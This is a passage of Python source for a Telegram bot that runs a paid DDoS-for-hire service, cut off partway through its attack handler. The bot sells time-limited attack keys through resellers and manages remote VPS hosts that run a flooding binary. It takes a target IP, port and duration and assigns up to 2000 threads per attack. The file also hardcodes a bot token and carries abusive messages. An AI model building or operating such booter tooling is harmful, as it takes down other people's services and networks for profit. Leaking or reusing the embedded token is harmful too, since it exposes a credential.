import os
import time
import logging
import asyncio
import random
import json
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram.helpers import escape_markdown
import paramiko
from scp import SCPClient
import sys
import subprocess
import threading
from pathlib import Path

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)



# Bot management system
BOT_INSTANCES = {}  # Stores running bot processes
BOT_CONFIG_FILE = "bot_configs.json"



# Bot Configuration
TELEGRAM_BOT_TOKEN = '7622864970:AAF5zpg202jB4m1XBKR6Bj02XGpQ3Rem8Ks'
OWNER_USERNAME = "RAJARAJ909"
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "Contact @rajaraj909 to buy keys"
ALLOWED_GROUP_IDS = [-1002834218110]
MAX_THREADS = 1000
max_duration = 120
bot_open = False
SPECIAL_MAX_DURATION = 240
SPECIAL_MAX_THREADS = 2000
BOT_START_TIME = time.time()

# Display Name Configuration
GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
DISPLAY_NAME_FILE = "display_names.json"

# VPS Configuration
VPS_FILE = "vps.txt"
BINARY_NAME = "raja"
BINARY_PATH = f"/home/master/{BINARY_NAME}"
VPS_LIST = []

# Key Prices
KEY_PRICES = {
    "1H": 5,
    "2H": 10,  # Price for 1-hour key
    "3H": 15,  # Price for 1-hour key
    "4H": 20,  # Price for 1-hour key
    "5H": 25,  # Price for 1-hour key
    "6H": 30,  # Price for 1-hour key
    "7H": 35,  # Price for 1-hour key
    "8H": 40,  # Price for 1-hour key
    "9H": 45,  # Price for 1-hour key
    "10H": 50, # Price for 1-hour key
    "1D": 60,  # Price for 1-day key
    "2D": 100,  # Price for 1-day key
    "3D": 160, # Price for 1-day key
    "5D": 250, # Price for 2-day key
    "7D": 320, # Price for 2-day key
    "15D": 700, # Price for 2-day key
    "30D": 1250, # Price for 2-day key
    "60D": 2000, # Price for 2-day key,
}

# Special Key Prices
SPECIAL_KEY_PRICES = {
    "1D": 70,
    "2D": 130,  # 30 days special key price
    "3D": 250,  # 30 days special key price
    "4D": 300,  # 30 days special key price
    "5D": 400,  # 30 days special key price
    "6D": 500,  # 30 days special key price
    "7D": 550,  # 30 days special key price
    "8D": 600,  # 30 days special key price
    "9D": 750,  # 30 days special key price
    "10D": 800,  # 30 days special key price
    "11D": 850,  # 30 days special key price
    "12D": 900,  # 30 days special key price
    "13D": 950,  # 30 days special key price
    "14D": 1000,  # 30 days special key price
    "15D": 1050,  # 30 days special key price
    "30D": 1500,  # 30 days special key price
}

# Image configuration
START_IMAGES = [
    {
        'url': 'https://files.catbox.moe/96bnxi.jpg',
        'caption':(
            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
            '💀 *maa chod do lobby ki* 💀\n\n'
            '🔑 *haters ki ma chodne wala RAJA *\n\n'
            '⚠️ *HATERS KA DUSRA BAAP NXR TEAM 🤬*⚠️\n\n'
            '⚠️ *DM FOR BUY KEY - 🤬*\n\n'
        )
    },
]

# File to store key data
KEY_FILE = "keys.txt"

# Key System
keys = {}
special_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
feedback_waiting = {}

# Reseller System
resellers = set()
reseller_balances = {}

# Global Cooldown
global_cooldown = 0
last_attack_time = 0

# Track running attacks
running_attacks = {}

# Keyboards
group_user_keyboard = [
    ['Start', 'Attack'],
    ['Redeem Key', 'Rules'],
    ['🔍 Status', '⏳ Uptime']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

reseller_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['🔑 Special Key', 'Keys', '⏳ Uptime']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Settings menu keyboard with Reset VPS button
settings_keyboard = [
    ['Set Duration', 'Add Reseller'],
    ['Remove Reseller', 'Set Threads'],
    ['Add Coin', 'Set Cooldown'],
    ['Reset VPS', 'Back to Home']  # Added Reset VPS button here
]
settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)

owner_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Settings', '⚙️ Owner Settings', 'Generate Key'],
    ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
    ['OpenBot', 'CloseBot', 'Menu']
]

owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

co_owner_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Delete Key', 'Generate Key'],
    ['OpenBot', '🔑 Special Key', 'CloseBot'],
    ['Settings', '⏳ Uptime', 'Menu']
]
co_owner_markup = ReplyKeyboardMarkup(co_owner_keyboard, resize_keyboard=True)

# Menu keyboards
owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Add VPS', 'Remove VPS'],
    ['Add Co-Owner', 'Remove Co-Owner'],
    ['Set Display Name', 'Upload Binary'],
    ['Back to Home']
]
owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=True)

co_owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Set Display Name', 'Add VPS'],
    ['Back to Home', 'Upload Binary']
]
co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)

owner_settings_keyboard = [
    ['Set Duration', 'Set Threads', 'Set Cooldown'],
    ['Add Reseller', 'Remove Reseller', 'Add Coin'],
    ['Reset VPS', 'Add VPS', 'Remove VPS'],
    ['Upload Binary', 'Add Co-Owner', 'Remove Co-Owner'],
    ['Back to Home']
]
owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)

# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_SPECIAL_KEY_DURATION = 12
GET_SPECIAL_KEY_FORMAT = 13
ADD_GROUP_ID = 14
REMOVE_GROUP_ID = 15
MENU_SELECTION = 16
GET_RESELLER_INFO = 17
GET_VPS_INFO = 18
GET_VPS_TO_REMOVE = 19
CONFIRM_BINARY_UPLOAD = 20
GET_ADD_CO_OWNER_ID = 21
GET_REMOVE_CO_OWNER_ID = 22
GET_DISPLAY_NAME = 23
GET_GROUP_FOR_DISPLAY_NAME = 24
# New conversation states (add these with other states)
GET_BOT_TOKEN = 25
GET_OWNER_USERNAME = 26

def get_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_display_name(group_id=None):
    """Returns the current display name for the owner in specific group or default"""
    if group_id is None:
        return GROUP_DISPLAY_NAMES.get('default', f"@{OWNER_USERNAME}")
    return GROUP_DISPLAY_NAMES.get(group_id, GROUP_DISPLAY_NAMES.get('default', f"@{OWNER_USERNAME}"))

async def owner_settings(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can access these settings!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚙️ *Owner Settings Menu*\n\n"
        f"Select an option below:\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown',
        reply_markup=owner_settings_markup
    )

async def set_display_name(update: Update, new_name: str, group_id=None):
    """Updates the display name for specific group or default"""
    if group_id is not None:
        GROUP_DISPLAY_NAMES[group_id] = new_name
    else:
        GROUP_DISPLAY_NAMES['default'] = new_name
    
    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f)
    
    if update:
        await update.message.reply_text(
            f"✅ Display name updated to: {new_name}" + 
            (f" for group {group_id}" if group_id else " as default name"),
            parse_mode='Markdown'
        )

def load_display_name():
    """Loads the display names from file"""
    global GROUP_DISPLAY_NAMES
    if os.path.exists(DISPLAY_NAME_FILE):
        try:
            with open(DISPLAY_NAME_FILE, 'r') as f:
                GROUP_DISPLAY_NAMES = json.load(f)
            new_dict = {}
            for k, v in GROUP_DISPLAY_NAMES.items():
                try:
                    if k != 'default':
                        new_dict[int(k)] = v
                    else:
                        new_dict[k] = v
                except ValueError:
                    new_dict[k] = v
            GROUP_DISPLAY_NAMES = new_dict
        except (json.JSONDecodeError, ValueError):
            GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}
    else:
        GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}

def load_keys():
    if not os.path.exists(KEY_FILE):
        return

    with open(KEY_FILE, "r") as file:
        for line in file:
            key_type, key_data = line.strip().split(":", 1)
            if key_type == "ACTIVE_KEY":
                parts = key_data.split(",")
                if len(parts) == 2:
                    key, expiration_time = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': None
                    }
                elif len(parts) == 3:
                    key, expiration_time, generated_by = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': int(generated_by)
                    }
            elif key_type == "REDEEMED_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = float(expiration_time)
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by)
                }
            elif key_type == "SPECIAL_KEY":
                key, expiration_time, generated_by = key_data.split(",")
                special_keys[key] = {
                    'expiration_time': float(expiration_time),
                    'generated_by': int(generated_by)
                }
            elif key_type == "REDEEMED_SPECIAL_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = {
                    'expiration_time': float(expiration_time),
                    'is_special': True
                }
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by),
                    'is_special': True
                }

def save_keys():
    with open(KEY_FILE, "w") as file:
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        for key, key_info in special_keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        for key, key_info in redeemed_keys_info.items():
            if key_info['redeemed_by'] in redeemed_users:
                if 'is_special' in key_info and key_info['is_special']:
                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]['expiration_time']}\n")
                else:
                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")

def load_bot_configs():
    """Load bot configurations from file"""
    if not os.path.exists(BOT_CONFIG_FILE):
        return []
    
    try:
        with open(BOT_CONFIG_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, ValueError):
        return []

def load_vps():
    global VPS_LIST
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            VPS_LIST = [line.strip().split(',') for line in f.readlines()]

def save_vps():
    with open(VPS_FILE, 'w') as f:
        for vps in VPS_LIST:
            f.write(','.join(vps) + '\n')

def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS

def is_owner(update: Update):
    return update.effective_user.username == OWNER_USERNAME

def is_co_owner(update: Update):
    return update.effective_user.id in CO_OWNERS

def is_reseller(update: Update):
    return update.effective_user.id in resellers

def is_authorized_user(update: Update):
    return is_owner(update) or is_co_owner(update) or is_reseller(update)

def get_random_start_image():
    return random.choice(START_IMAGES)

async def reset_vps(update: Update, context: CallbackContext):
    """Reset all busy VPS to make them available again"""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can reset VPS!*", parse_mode='Markdown')
        return
    
    global running_attacks
    
    # Count how many VPS are busy
    busy_count = len(running_attacks)
    
    if busy_count == 0:
        await update.message.reply_text("ℹ️ *No VPS are currently busy.*", parse_mode='Markdown')
        return
    
    # Clear all running attacks
    running_attacks.clear()
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"✅ *Reset {busy_count} busy VPS - they are now available for new attacks!*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    
def save_bot_configs(configs):
    """Save bot configurations to file"""
    with open(BOT_CONFIG_FILE, 'w') as f:
        json.dump(configs, f)

async def add_bot_instance(update: Update, context: CallbackContext):
    """Add a new bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ Enter the new bot token:",
        parse_mode='Markdown'
    )
    return GET_BOT_TOKEN

async def add_bot_token(update: Update, context: CallbackContext):
    """Get bot token for new instance"""
    token = update.message.text.strip()
    context.user_data['new_bot_token'] = token
    
    await update.message.reply_text(
        "⚠️ Enter the owner username for this bot:",
        parse_mode='Markdown'
    )
    return GET_OWNER_USERNAME

async def set_duration_button(update: Update, context: CallbackContext):
    await set_duration_start(update, context)

async def set_threads_button(update: Update, context: CallbackContext):
    await set_threads_start(update, context)

async def set_cooldown_button(update: Update, context: CallbackContext):
    await set_cooldown_start(update, context)

async def add_reseller_button(update: Update, context: CallbackContext):
    await add_reseller_start(update, context)

async def remove_reseller_button(update: Update, context: CallbackContext):
    await remove_reseller_start(update, context)

async def add_coin_button(update: Update, context: CallbackContext):
    await add_coin_start(update, context)

async def reset_vps_button(update: Update, context: CallbackContext):
    await reset_vps(update, context)

async def add_vps_button(update: Update, context: CallbackContext):
    await add_vps_start(update, context)

async def remove_vps_button(update: Update, context: CallbackContext):
    await remove_vps_start(update, context)

async def upload_binary_button(update: Update, context: CallbackContext):
    await upload_binary_start(update, context)

async def add_co_owner_button(update: Update, context: CallbackContext):
    await add_co_owner_start(update, context)

async def remove_co_owner_button(update: Update, context: CallbackContext):
    await remove_co_owner_start(update, context)

async def stop_bot_instance(update: Update, context: CallbackContext):
    """Stop a specific bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can stop bot instances!", parse_mode='Markdown')
        return
    
    try:
        if not context.args:
            await show_bot_list(update, context)
            return
            
        bot_index = int(context.args[0])
        configs = load_bot_configs()
        
        if bot_index >= len(configs):
            await update.message.reply_text("❌ Invalid bot index!", parse_mode='Markdown')
            await show_bot_list(update, context)
            return
        
        config = configs[bot_index]
        
        if config['token'] not in BOT_INSTANCES:
            await update.message.reply_text(
                "ℹ️ This bot instance is not running!",
                parse_mode='Markdown'
            )
            return
        
        # Stop the bot process
        process = BOT_INSTANCES[config['token']]
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
        
        del BOT_INSTANCES[config['token']]
        config['active'] = False
        save_bot_configs(configs)
        
        await update.message.reply_text(
            f"✅ Stopped bot instance {bot_index} with owner @{config['owner_username']}",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ Error stopping bot: {str(e)}",
            parse_mode='Markdown'
        )

async def show_bot_list(update: Update, context: CallbackContext):
    """Show list of configured bot instances"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can view bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    
    if not configs:
        await update.message.reply_text(
            "ℹ️ No bot instances configured yet! Use /addbot to add one.",
            parse_mode='Markdown'
        )
        return
    
    message = "📋 Configured Bot Instances:\n\n"
    for i, config in enumerate(configs):
        status = "🟢 Running" if config.get('active', False) else "🔴 Stopped"
        message += (
            f"{i}. Owner: @{config['owner_username']}\n"
            f"   Status: {status}\n"
            f"   Commands:\n"
            f"   /stopbot_{i} - Stop this instance\n\n"
        )
    
    await update.message.reply_text(
        message,
        parse_mode='Markdown'
    )

async def open_bot(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = True
    await update.message.reply_text(
        "✅ *Bot opened! Users can now attack for 120 seconds without keys.*\n"
        f"🔑 *For 200 seconds attacks, keys are still required. Buy from *",
        parse_mode='Markdown'
    )

async def close_bot(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = False
    await update.message.reply_text(
        "✅ *Bot closed! Users now need keys for all attacks.*\n",
        parse_mode='Markdown'
    )

async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat
    image = get_random_start_image()
    
    current_display_name = get_display_name(chat.id if chat.type in ['group', 'supergroup'] else None)
    
    modified_caption = (
        f"{image['caption']}\n\n"
    )
    
    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=f"❌ \*This bot is not authorized to use here\.\*\n\n",
                parse_mode='MarkdownV2'
            )
            return

        if is_owner(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=modified_caption,
                parse_mode='Markdown',
                reply_markup=owner_markup
            )
        elif is_co_owner(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=modified_caption,
                parse_mode='Markdown',
                reply_markup=co_owner_markup
            )
        else:
            await update.message.reply_photo(
                photo=image['url'],
                caption=modified_caption,
                parse_mode='Markdown',
                reply_markup=reseller_markup
            )
        return

    if not is_allowed_group(update):
        return

    await update.message.reply_photo(
        photo=image['url'],
        caption=modified_caption,
        parse_mode='Markdown',
        reply_markup=group_user_markup
    )

async def show_bot_list(update: Update, context: CallbackContext):
    """Show list of configured bot instances"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can view bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    
    if not configs:
        await update.message.reply_text(
            "ℹ️ No bot instances configured yet! Use /addbot to add one.",
            parse_mode='Markdown'
        )
        return
    
    message = "📋 Configured Bot Instances:\n\n"
    for i, config in enumerate(configs):
        status = "🟢 Running" if config.get('active', False) else "🔴 Stopped"
        message += (
            f"{i}. Owner: @{config['owner_username']}\n"
            f"   Status: {status}\n"
            f"   Commands:\n"
            f"   /stopbot_{i} - Stop this instance\n\n"
        )
    
    await update.message.reply_text(
        message,
        parse_mode='Markdown'
    )
    
def load_bot_configs():
    """Load bot configurations from file"""
    if not os.path.exists(BOT_CONFIG_FILE):
        return []
    
    try:
        with open(BOT_CONFIG_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, ValueError):
        return []

def save_bot_configs(configs):
    """Save bot configurations to file"""
    with open(BOT_CONFIG_FILE, 'w') as f:
        json.dump(configs, f)

async def add_bot_instance(update: Update, context: CallbackContext):
    """Add a new bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ Enter the new bot token:",
        parse_mode='Markdown'
    )
    return GET_BOT_TOKEN

async def add_bot_token(update: Update, context: CallbackContext):
    """Get bot token for new instance"""
    token = update.message.text.strip()
    context.user_data['new_bot_token'] = token
    
    await update.message.reply_text(
        "⚠️ Enter the owner username for this bot:",
        parse_mode='Markdown'
    )
    return GET_OWNER_USERNAME

async def add_owner_username(update: Update, context: CallbackContext):
    """Get owner username and start new bot instance"""
    owner_username = update.message.text.strip()
    token = context.user_data['new_bot_token']
    
    # Load existing configs
    configs = load_bot_configs()
    
    # Check if token already exists
    if any(c['token'] == token for c in configs):
        await update.message.reply_text(
            "❌ This bot token is already configured!",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Add new config
    new_config = {
        'token': token,
        'owner_username': owner_username,
        'active': False
    }
    configs.append(new_config)
    save_bot_configs(configs)
    
    # Start the new bot instance
    process = subprocess.Popen(
        [sys.executable, str(Path(__file__).resolve()), "--token", token, "--owner", owner_username],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    BOT_INSTANCES[token] = process
    new_config['active'] = True
    save_bot_configs(configs)
    
    # Update the display name for this bot instance
    GROUP_DISPLAY_NAMES['default'] = f"@{owner_username}"
    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f)
    
    # Escape Markdown characters in the token display
    display_token = escape_markdown(token[:10] + "...", version=2)
    display_username = escape_markdown(owner_username, version=2)
    
    await update.message.reply_text(
        f"✅ New bot instance added and started\!\n\n"
        f"Token\: `{display_token}`\n"
        f"Owner\: @{display_username}\n\n"
        f"Use /stopbot\_{len(configs)-1} to stop this instance\.",
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

async def generate_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).*", parse_mode='Markdown')
    return GET_DURATION

async def generate_key_duration(update: Update, context: CallbackContext):
    duration_str = update.message.text

    if duration_str not in KEY_PRICES:
        await update.message.reply_text("❌ *Invalid format! Use 1H, 1D, or 2D.*", parse_mode='Markdown')
        return ConversationHandler.END

    user_id = update.effective_user.id
    if is_reseller(update):
        price = KEY_PRICES[duration_str]
        if user_id not in reseller_balances or reseller_balances[user_id] < price:
            await update.message.reply_text(f"❌ *Insufficient balance! You need {price} coins to generate this key.*", parse_mode='Markdown')
            return ConversationHandler.END

    unique_key = os.urandom(4).hex().upper()
    key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"
    keys[key] = {
        'expiration_time': time.time() + (int(duration_str[:-1]) * 3600 if duration_str.endswith('H') else int(duration_str[:-1]) * 86400),
        'generated_by': user_id
    }

    if is_reseller(update):
        reseller_balances[user_id] -= KEY_PRICES[duration_str]

    save_keys()

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"🔑 *Generated Key:* `{key}`\n\n"
        f"*This key is valid for {duration_str}.*\n\n",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def generate_special_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate special keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ *Enter the duration for the special key in days (e.g., 7 for 7 days, 30 for 30 days):*",
        parse_mode='Markdown'
    )
    return GET_SPECIAL_KEY_DURATION

async def generate_special_key_duration(update: Update, context: CallbackContext):
    try:
        days = int(update.message.text)
        if days <= 0:
            await update.message.reply_text("❌ *Duration must be greater than 0!*", parse_mode='Markdown')
            return ConversationHandler.END
            
        if is_reseller(update):
            user_id = update.effective_user.id
            price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
            if user_id not in reseller_balances or reseller_balances[user_id] < price:
                await update.message.reply_text(
                    f"❌ *Insufficient balance! You need {price} coins to generate this special key.*",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        context.user_data['special_key_days'] = days
        await update.message.reply_text(
            "⚠️ *Enter the custom format for the special key (e.g., 'CHUTIYA-TU-HA' will create key 'SPECIAL-CHUTIYA-TU-HA-XXXX'):*",
            parse_mode='Markdown'
        )
        return GET_SPECIAL_KEY_FORMAT
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

async def generate_special_key_format(update: Update, context: CallbackContext):
    custom_format = update.message.text.strip().upper()
    days = context.user_data.get('special_key_days', 30)
    
    if is_reseller(update):
        user_id = update.effective_user.id
        price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
        reseller_balances[user_id] -= price
    
    random_suffix = os.urandom(2).hex().upper()
    key = f"SPECIAL-{custom_format}-{random_suffix}"
    expiration_time = time.time() + (days * 86400)
    
    special_keys[key] = {
        'expiration_time': expiration_time,
        'generated_by': update.effective_user.id
    }
    
    save_keys()
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"💎 *Special Key Generated!*\n\n"
        f"🔑 *Key:* `{key}`\n"
        f"⏳ *Duration:* {days} days\n"
        f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
        f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
        f"👑 *Bot Owner:* PAPA KA BOT\n\n"
        f"⚠️ *This key provides enhanced attack capabilities when you fucking mommy!*",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def redeem_key_start(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id)
    
    await update.message.reply_text(
        "⚠️ *Enter the key to redeem.*\n\n"
        f"🔑 *Buy keys from {current_display_name}*",
        parse_mode='Markdown'
    )
    return GET_KEY

async def redeem_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys and keys[key]['expiration_time'] > time.time():
        user_id = update.effective_user.id
        redeemed_users[user_id] = keys[key]['expiration_time']
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by']
        }
        del keys[key]
        
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
        user_id = update.effective_user.id
        redeemed_users[user_id] = {
            'expiration_time': special_keys[key]['expiration_time'],
            'is_special': True
        }
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': special_keys[key]['generated_by'],
            'is_special': True
        }
        del special_keys[key]
        
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"💎 *Special Key Redeemed!*\n\n"
            f"*You now have access to enhanced attacks:*\n"
            f"• Max Duration: {SPECIAL_MAX_DURATION} sec\n"
            f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n\n"
            f"⚡ *Happy attacking and ki maka chut phaad do!*",
            parse_mode='Markdown'
        )
    else:
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"❌ *Invalid or expired key!*\n\n"
            f"🔑 *Buy valid keys from {current_display_name}*",
            parse_mode='Markdown'
        )
    
    save_keys()
    return ConversationHandler.END

async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
            return ConversationHandler.END

    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    global last_attack_time, global_cooldown

    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"❌ *Please wait! Cooldown is active. Remaining: {remaining_cooldown} seconds.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    user_id = update.effective_user.id

    # Fixed condition with proper parentheses
    user_has_access = False
    if bot_open:
        user_has_access = True
    elif user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            if redeemed_users[user_id].get('is_special', False):
                user_has_access = True
        elif isinstance(redeemed_users[user_id], (int, float)):
            user_has_access = True

    if user_has_access:
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            "⚠️ *Enter the attack arguments: <ip> <port> <duration>*\n\n"
            f"ℹ️ *When bot is open, max duration is {max_duration} sec. For {SPECIAL_MAX_DURATION} sec, you need a key.*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return GET_ATTACK_ARGS
    else:
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            "❌ *You need a valid key to start an attack!*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks

    args = update.message.text.split()
    if len(args) != 3:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n"
            f"💬 *Need a key for 200s? DM:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    ip, port, duration = args
    duration = int(duration)
    
    # Set threads automatically based on duration
    if duration <= 30:
        threads = 900
